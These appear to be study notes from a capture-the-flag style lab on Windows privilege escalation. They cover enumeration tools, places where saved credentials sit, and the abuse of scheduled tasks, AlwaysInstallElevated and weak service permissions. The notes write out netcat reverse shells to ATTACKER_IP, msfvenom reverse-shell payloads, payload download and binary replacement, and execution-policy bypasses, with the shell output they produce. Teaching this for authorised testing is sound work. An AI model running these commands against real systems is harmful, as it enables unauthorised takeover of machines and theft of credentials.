Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded here:
```
https://github.com/bitsadmin/wesng
```

Once installed, and before using it, type the wes.py --update command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;
```
wes.py systeminfo.txt
```
or like this
```
# python wes.py systeminfo.txt -i 'Elevation
of Privilege' --exploits-only | less
```
same but if you have it installed do this and you have it on the same folder shared over smb you can do this in your own kali machin
```
# wes systeminfo.txt -i 'Elevation
of Privilege' --exploits-only | less
```


### seatbelt
Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives. 
```
https://github.com/GhostPack/Seatbelt
```
```
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/seatbelt
```

Available commands (+ means remote usage is supported):

    + AMSIProviders          - Providers registered for AMSI
    + AntiVirus              - Registered antivirus (via WMI)
    + AppLocker              - AppLocker settings, if installed
      ARPTable               - Lists the current ARP table and adapter information (equivalent to arp -a)
      AuditPolicies          - Enumerates classic and advanced audit policy settings
    + AuditPolicyRegistry    - Audit settings via the registry
    + AutoRuns               - Auto run executables/scripts/programs
      Certificates           - Finds user and machine personal certificate files
      CertificateThumbprints - Finds thumbprints for all certificate store certs on the systen
    + ChromiumBookmarks      - Parses any found Chrome/Edge/Brave/Opera bookmark files
    + ChromiumHistory        - Parses any found Chrome/Edge/Brave/Opera history files
    + ChromiumPresence       - Checks if interesting Chrome/Edge/Brave/Opera files exist
    + CloudCredentials       - AWS/Google/Azure/Bluemix cloud credential files
    + CloudSyncProviders     - All configured Office 365 endpoints (tenants and teamsites) which are synchronised by OneDrive.
      CredEnum               - Enumerates the current user's saved credentials using CredEnumerate()
    + CredGuard              - CredentialGuard configuration
      dir                    - Lists files/folders. By default, lists users' downloads, documents, and desktop folders (arguments == [directory] [maxDepth] [regex] [boolIgnoreErrors]
    + DNSCache               - DNS cache entries (via WMI)
    + DotNet                 - DotNet versions
    + DpapiMasterKeys        - List DPAPI master keys
      Dsregcmd               - Return Tenant information - Replacement for Dsregcmd /status
      EnvironmentPath        - Current environment %PATH$ folders and SDDL information
    + EnvironmentVariables   - Current environment variables
    + ExplicitLogonEvents    - Explicit Logon events (Event ID 4648) from the security event log. Default of 7 days, argument == last X days.
      ExplorerMRUs           - Explorer most recently used files (last 7 days, argument == last X days)
    + ExplorerRunCommands    - Recent Explorer "run" commands
      FileInfo               - Information about a file (version information, timestamps, basic PE info, etc. argument(s) == file path(s)
    + FileZilla              - FileZilla configuration files
    + FirefoxHistory         - Parses any found FireFox history files
    + FirefoxPresence        - Checks if interesting Firefox files exist
    + Hotfixes               - Installed hotfixes (via WMI)
      IdleTime               - Returns the number of seconds since the current user's last input.
    + IEFavorites            - Internet Explorer favorites
      IETabs                 - Open Internet Explorer tabs
    + IEUrls                 - Internet Explorer typed URLs (last 7 days, argument == last X days)
    + InstalledProducts      - Installed products via the registry
      InterestingFiles       - "Interesting" files matching various patterns in the user's folder. Note: takes non-trivial time.
    + InterestingProcesses   - "Interesting" processes - defensive products and admin tools
      InternetSettings       - Internet settings including proxy configs and zones configuration
    + KeePass                - Finds KeePass configuration files
    + LAPS                   - LAPS settings, if installed
    + LastShutdown           - Returns the DateTime of the last system shutdown (via the registry).
      LocalGPOs              - Local Group Policy settings applied to the machine/local users
    + LocalGroups            - Non-empty local groups, "-full" displays all groups (argument == computername to enumerate)
    + LocalUsers             - Local users, whether they're active/disabled, and pwd last set (argument == computername to enumerate)
    + LogonEvents            - Logon events (Event ID 4624) from the security event log. Default of 10 days, argument == last X days.
    + LogonSessions          - Windows logon sessions
      LOLBAS                 - Locates Living Off The Land Binaries and Scripts (LOLBAS) on the system. Note: takes non-trivial time.
    + LSASettings            - LSA settings (including auth packages)
    + MappedDrives           - Users' mapped drives (via WMI)
      McAfeeConfigs          - Finds McAfee configuration files
      McAfeeSiteList         - Decrypt any found McAfee SiteList.xml configuration files.
      MicrosoftUpdates       - All Microsoft updates (via COM)
      NamedPipes             - Named pipe names, any readable ACL information and associated process information.
    + NetworkProfiles        - Windows network profiles
    + NetworkShares          - Network shares exposed by the machine (via WMI)
    + NTLMSettings           - NTLM authentication settings
      OfficeMRUs             - Office most recently used file list (last 7 days)
      OneNote                - List OneNote backup files
    + OptionalFeatures       - List Optional Features/Roles (via WMI)
      OracleSQLDeveloper     - Finds Oracle SQLDeveloper connections.xml files
    + OSInfo                 - Basic OS info (i.e. architecture, OS version, etc.)
    + OutlookDownloads       - List files downloaded by Outlook
    + PoweredOnEvents        - Reboot and sleep schedule based on the System event log EIDs 1, 12, 13, 42, and 6008. Default of 7 days, argument == last X days.
    + PowerShell             - PowerShell versions and security settings
    + PowerShellEvents       - PowerShell script block logs (4104) with sensitive data.
    + PowerShellHistory      - Searches PowerShell console history files for sensitive regex matches.
      Printers               - Installed Printers (via WMI)
    + ProcessCreationEvents  - Process creation logs (4688) with sensitive data.
      Processes              - Running processes with file info company names that don't contain 'Microsoft', "-full" enumerates all processes
    + ProcessOwners          - Running non-session 0 process list with owners. For remote use.
    + PSSessionSettings      - Enumerates PS Session Settings from the registry
    + PuttyHostKeys          - Saved Putty SSH host keys
    + PuttySessions          - Saved Putty configuration (interesting fields) and SSH host keys
      RDCManFiles            - Windows Remote Desktop Connection Manager settings files
    + RDPSavedConnections    - Saved RDP connections stored in the registry
    + RDPSessions            - Current incoming RDP sessions (argument == computername to enumerate)
    + RDPsettings            - Remote Desktop Server/Client Settings
      RecycleBin             - Items in the Recycle Bin deleted in the last 30 days - only works from a user context!
      reg                    - Registry key values (HKLM\Software by default) argument == [Path] [intDepth] [Regex] [boolIgnoreErrors]
      RPCMappedEndpoints     - Current RPC endpoints mapped
    + SCCM                   - System Center Configuration Manager (SCCM) settings, if applicable
    + ScheduledTasks         - Scheduled tasks (via WMI) that aren't authored by 'Microsoft', "-full" dumps all Scheduled tasks
      SearchIndex            - Query results from the Windows Search Index, default term of 'passsword'. (argument(s) == <search path> <pattern1,pattern2,...>
      SecPackageCreds        - Obtains credentials from security packages
      SecurityPackages       - Enumerates the security packages currently available using EnumerateSecurityPackagesA()
      Services               - Services with file info company names that don't contain 'Microsoft', "-full" dumps all processes
    + SlackDownloads         - Parses any found 'slack-downloads' files
    + SlackPresence          - Checks if interesting Slack files exist
    + SlackWorkspaces        - Parses any found 'slack-workspaces' files
    + SuperPutty             - SuperPutty configuration files
    + Sysmon                 - Sysmon configuration from the registry
    + SysmonEvents           - Sysmon process creation logs (1) with sensitive data.
      TcpConnections         - Current TCP connections and their associated processes and services
      TokenGroups            - The current token's local and domain groups
      TokenPrivileges        - Currently enabled token privileges (e.g. SeDebugPrivilege/etc.)
    + UAC                    - UAC system policies via the registry
      UdpConnections         - Current UDP connections and associated processes and services
      UserRightAssignments   - Configured User Right Assignments (e.g. SeDenyNetworkLogonRight, SeShutdownPrivilege, etc.) argument == computername to enumerate
      WifiProfile            - Enumerates the saved Wifi profiles and extract the ssid, authentication type, cleartext key/passphrase (when possible)
    + WindowsAutoLogon       - Registry autologon information
      WindowsCredentialFiles - Windows credential DPAPI blobs
    + WindowsDefender        - Windows Defender settings (including exclusion locations)
    + WindowsEventForwarding - Windows Event Forwarding (WEF) settings via the registry
    + WindowsFirewall        - Non-standard firewall rules, "-full" dumps all (arguments == allow/deny/tcp/udp/in/out/domain/private/public)
      WindowsVault           - Credentials saved in the Windows Vault (i.e. logins from Internet Explorer and Edge).
    + WMI                    - Runs a specified WMI query
      WMIEventConsumer       - Lists WMI Event Consumers
      WMIEventFilter         - Lists WMI Event Filters
      WMIFilterBinding       - Lists WMI Filter to Consumer Bindings
    + WSUS                   - Windows Server Update Services (WSUS) settings, if applicable


Seatbelt has the following command groups: All, User, System, Slack, Chromium, Remote, Misc

    You can invoke command groups with         "Seatbelt.exe <group>"


    Or command groups except specific commands "Seatbelt.exe <group> -Command"

   "Seatbelt.exe -group=all" runs all commands

   "Seatbelt.exe -group=user" runs the following commands:

        Certificates, CertificateThumbprints, ChromiumPresence, CloudCredentials, CloudSyncProviders,
        CredEnum, dir, DpapiMasterKeys, Dsregcmd,
        ExplorerMRUs, ExplorerRunCommands, FileZilla, FirefoxPresence,
        IdleTime, IEFavorites, IETabs, IEUrls,
        KeePass, MappedDrives, OfficeMRUs, OneNote,
        OracleSQLDeveloper, PowerShellHistory, PuttyHostKeys, PuttySessions,
        RDCManFiles, RDPSavedConnections, SecPackageCreds, SlackDownloads,
        SlackPresence, SlackWorkspaces, SuperPutty, TokenGroups,
        WindowsCredentialFiles, WindowsVault

   "Seatbelt.exe -group=system" runs the following commands:

        AMSIProviders, AntiVirus, AppLocker, ARPTable, AuditPolicies,
        AuditPolicyRegistry, AutoRuns, Certificates, CertificateThumbprints,
        CredGuard, DNSCache, DotNet, EnvironmentPath,
        EnvironmentVariables, Hotfixes, InterestingProcesses, InternetSettings,
        LAPS, LastShutdown, LocalGPOs, LocalGroups,
        LocalUsers, LogonSessions, LSASettings, McAfeeConfigs,
        NamedPipes, NetworkProfiles, NetworkShares, NTLMSettings,
        OptionalFeatures, OSInfo, PoweredOnEvents, PowerShell,
        Processes, PSSessionSettings, RDPSessions, RDPsettings,
        SCCM, Services, Sysmon, TcpConnections,
        TokenPrivileges, UAC, UdpConnections, UserRightAssignments,
        WifiProfile, WindowsAutoLogon, WindowsDefender, WindowsEventForwarding,
        WindowsFirewall, WMI, WMIEventConsumer, WMIEventFilter,
        WMIFilterBinding, WSUS

   "Seatbelt.exe -group=slack" runs the following commands:

        SlackDownloads, SlackPresence, SlackWorkspaces

   "Seatbelt.exe -group=chromium" runs the following commands:

        ChromiumBookmarks, ChromiumHistory, ChromiumPresence

   "Seatbelt.exe -group=remote" runs the following commands:

        AMSIProviders, AntiVirus, AuditPolicyRegistry, ChromiumPresence, CloudCredentials,
        DNSCache, DotNet, DpapiMasterKeys, EnvironmentVariables,
        ExplicitLogonEvents, ExplorerRunCommands, FileZilla, Hotfixes,
        InterestingProcesses, KeePass, LastShutdown, LocalGroups,
        LocalUsers, LogonEvents, LogonSessions, LSASettings,
        MappedDrives, NetworkProfiles, NetworkShares, NTLMSettings,
        OptionalFeatures, OSInfo, PoweredOnEvents, PowerShell,
        ProcessOwners, PSSessionSettings, PuttyHostKeys, PuttySessions,
        RDPSavedConnections, RDPSessions, RDPsettings, Sysmon,
        WindowsDefender, WindowsEventForwarding, WindowsFirewall

   "Seatbelt.exe -group=misc" runs the following commands:

        ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo, FirefoxHistory,
        InstalledProducts, InterestingFiles, LogonEvents, LOLBAS,
        McAfeeSiteList, MicrosoftUpdates, OutlookDownloads, PowerShellEvents,
        Printers, ProcessCreationEvents, ProcessOwners, RecycleBin,
        reg, RPCMappedEndpoints, ScheduledTasks, SearchIndex,
        SecurityPackages, SysmonEvents


Examples:
    'Seatbelt.exe <Command> [Command2] ...' will run one or more specified checks only
    'Seatbelt.exe <Command> -full' will return complete results for a command without any filtering.
    'Seatbelt.exe "<Command> [argument]"' will pass an argument to a command that supports it (note the quotes).
    'Seatbelt.exe -group=all' will run ALL enumeration checks, can be combined with "-full".
    'Seatbelt.exe -group=all -AuditPolicies' will run all enumeration checks EXCEPT AuditPolicies, can be combined with "-full".
    'Seatbelt.exe <Command> -computername=COMPUTER.DOMAIN.COM [-username=DOMAIN\USER -password=PASSWORD]' will run an applicable check remotely
    'Seatbelt.exe -group=remote -computername=COMPUTER.DOMAIN.COM [-username=DOMAIN\USER -password=PASSWORD]' will run remote specific checks
    'Seatbelt.exe -group=system -outputfile="C:\Temp\out.txt"' will run system checks and output to a .txt file.
    'Seatbelt.exe -group=user -q -outputfile="C:\Temp\out.json"' will run in quiet mode with user checks and output to a .json file.

## winpeas

ops: winpeas can give a bit of false positive so be aware.
  
WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
```
C:\> winpeas.exe > outputfile.txt
```
Windows Privilege Escalation Awesome Scripts
```
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
```

### PrivescCheck
PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.
  
PrivescCheck can be downloaded here:
```
https://github.com/itm4n/PrivescCheck
```

Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below.
```
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```


#### Basic usage
From a command prompt:
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

From a PowerShell prompt:
```
Set-ExecutionPolicy Bypass -Scope process -Force
. .\PrivescCheck.ps1; Invoke-PrivescCheck
```

From a PowerShell prompt without modifying the execution policy:
```
Get-Content .\PrivescCheck.ps1 | Out-String | IEX
Invoke-PrivescCheck
```

#### Extended mode

By default, the scope is limited to vulnerability discovery but, you can get a lot more information with the -Extended option:
```
Invoke-PrivescCheck -Extended
```

#### Generate report files

You can use the -Report and -Format options to save the results of the script to files in various formats. Accepted formats are TXT, CSV, HTML and XML. If -Format is empty, the default format is TXT, which is a simple copy of what is printed on the terminal.

The value of -Report will be used as the base name for the final report, the extension will be automatically appended depending on the chosen format(s).
```
Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME%
Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML
```

### metasploit exploit suggester

If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

in a Meterpreter shell
```
multi/recon/local_exploit_suggester
```

### Harvesting Passwords from Usual Spots

#### Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

#### Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a "cmd.exe" prompt:

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
targeting just one user example:
```
type c:\users\SULJOV\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
  
Note: The command above will only work from cmd.exe, as Powershell won't recognize " %userprofile% " as an environment variable. To read the file from Powershell, you'd have to replace " %userprofile% " with " $Env:userprofile ". 

#### Saved Windows Credentials

Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
```
cmdkey /list
```
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.

```
runas /savecred /user:admin cmd.exe
```

#### IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```


Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.


#### Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### Other Quick Wins

Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.

#### Scheduled Tasks

Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

Scheduled tasks can be listed from the command line using the "schtasks" command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:

example:
```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use icacls:
```
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like.

as an example we have nc64.exe can be found on C:\tools as an example. Let's change the bat file to spawn a reverse shell:

example:
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
We then start a listener on the attacker machine on the same port we indicated on our reverse shell:

example:
```
nc -lvp 4444
```

The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, but if you have permission. We can run the task with the following command:

example:
```
schtasks /run /tn vulntask
```

And you will receive the reverse shell for an example with taskusr1 privileges as expected:

example:
```
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```

#### AlwaysInstallElevated'

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.


This method requires two registry values to be set. You can query these from the command line using the commands below.

```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

example:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.243.175 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:

```
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

### Abusing Service Misconfigurations

example:
```
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```
Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can also be seen from Process Hacker:
![image](https://user-images.githubusercontent.com/24814781/181227961-ad43bb9e-47ca-4f7e-8d3d-29d3f442413f.png)


All of the services configurations are stored on the registry under HKLM\SYSTEM\CurrentControlSet\Services\:
![image](https://user-images.githubusercontent.com/24814781/181228031-4eaaad3f-bfbc-4001-b112-f2cebe0c71e8.png)

A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.

#### Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using sc:

example:
```
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with 
the service is in C:\Progra~2\System~1\WService.exe. We then proceed to check the permissions on the executable:

example:
```
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:

exmaple:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```

example:
```
python3 -m http.server
```

example: (powershell)
```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```
obs: theres other ways to transfer the file, just remember that.


Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:

example:
```
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

We start a reverse listener on our attacker machine:

example:
```
nc -lvp 4445
```

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, if you have privileges to restart the service yourself. Use the following commands from a cmd.exe command prompt:

example:
```
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```
Note: PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:

example:
```
user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```

#### Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by "C:\Program Files\RealVNC\VNC Server\vncserver.exe", followed by the given parameters:

example:
```
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
Now let's look at another service without proper quotation:

example:
```
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```
When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:

![image](https://user-images.githubusercontent.com/24814781/181230650-ff2279aa-6a5d-490a-9fb2-c8c38d955340.png)

This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

    First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

While this sounds trivial, most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

as an example, the Administrator installed the Disk Sorter binaries under c:\MyPrograms. By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using icacls:

example:
```
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

The BUILTIN\\Users group has AD and WD privileges, allowing the user to create subdirectories and files, respectively.

The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:

example:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
```
then:
```
nc -lvp 4446
```
Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to C:\MyPrograms\Disk.exe. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:

example:
```
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```

Once the service gets restarted, your payload should execute:

example:
```
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

As a result, you'll get a reverse shell with example svcusr2 privileges:

example:
```
user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
```

#### Insecure Service Permissions
  
You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use "Accesschk" 
```
https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
```
